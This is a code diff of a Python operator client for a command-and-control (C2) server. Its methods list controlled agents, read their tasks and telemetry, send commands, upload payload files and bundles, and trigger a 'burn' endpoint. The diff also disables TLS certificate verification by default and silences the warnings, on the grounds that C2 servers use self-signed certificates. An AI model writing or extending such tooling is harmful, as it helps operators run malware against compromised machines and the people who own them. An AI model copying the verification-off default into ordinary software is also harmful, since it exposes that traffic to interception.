@@ -2,21 +2,36 @@
 
 from __future__ import annotations
 
+import urllib3
 import requests
+
+# C2 typically runs behind a self-signed cert — suppress the noise.
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+_SSL = False  # set to True only if C2 has a trusted cert
+
+
+def _normalize(addr: str) -> str:
+    """Ensure addr has a scheme. Port 443 → https, everything else → http."""
+    if addr.startswith(("http://", "https://")):
+        return addr.rstrip("/")
+    scheme = "https" if addr.endswith(":443") else "http"
+    return f"{scheme}://{addr}".rstrip("/")
 
 
 class C2ApiClient:
     def __init__(self, addr: str, jwt: str) -> None:
-        self.base = addr.rstrip("/")
+        self.base = _normalize(addr)
         self.jwt  = jwt
 
     @staticmethod
     def login(addr: str, username: str, password: str) -> "C2ApiClient":
-        base = addr.rstrip("/")
+        base = _normalize(addr)
         resp = requests.post(
             f"{base}/api/v1/operator/login",
             json={"username": username, "password": password},
             timeout=10,
+            verify=_SSL,
         )
         resp.raise_for_status()
         token = resp.json().get("token")
@@ -35,6 +50,7 @@ class C2ApiClient:
             headers=self._h(),
             params={"limit": limit},
             timeout=10,
+            verify=_SSL,
         )
         resp.raise_for_status()
         return resp.json().get("agents", [])
@@ -45,6 +61,7 @@ class C2ApiClient:
             headers=self._h(),
             params={"agent_id": agent_id, "limit": limit},
             timeout=10,
+            verify=_SSL,
         )
         resp.raise_for_status()
         return resp.json().get("tasks", [])
@@ -55,6 +72,7 @@ class C2ApiClient:
             headers=self._h(),
             params={"agent_id": agent_id, "limit": limit},
             timeout=10,
+            verify=_SSL,
         )
         resp.raise_for_status()
         return resp.json().get("telemetry", [])
@@ -70,6 +88,7 @@ class C2ApiClient:
             headers=self._h(),
             json={"command_type": command_type, "payload": payload or {}},
             timeout=10,
+            verify=_SSL,
         )
         resp.raise_for_status()
         return resp.json()
@@ -82,6 +101,7 @@ class C2ApiClient:
             headers=self._h(),
             files={"file": (filename, payload_bytes, "application/octet-stream")},
             timeout=60,
+            verify=_SSL,
         )
         resp.raise_for_status()
         return resp.json()
@@ -91,6 +111,7 @@ class C2ApiClient:
             f"{self.base}/api/v1/operator/payload/status",
             headers=self._h(),
             timeout=10,
+            verify=_SSL,
         )
         resp.raise_for_status()
         return resp.json()
@@ -101,6 +122,7 @@ class C2ApiClient:
             headers=self._h(),
             files={"bundle": ("bundle.bin", bundle_bytes, "application/octet-stream")},
             timeout=60,
+            verify=_SSL,
         )
         resp.raise_for_status()
         return resp.json()
@@ -112,6 +134,7 @@ class C2ApiClient:
             f"{self.base}/api/v1/operator/burn",
             headers=self._h(),
             timeout=30,
+            verify=_SSL,
         )
         resp.raise_for_status()
         return resp.json()
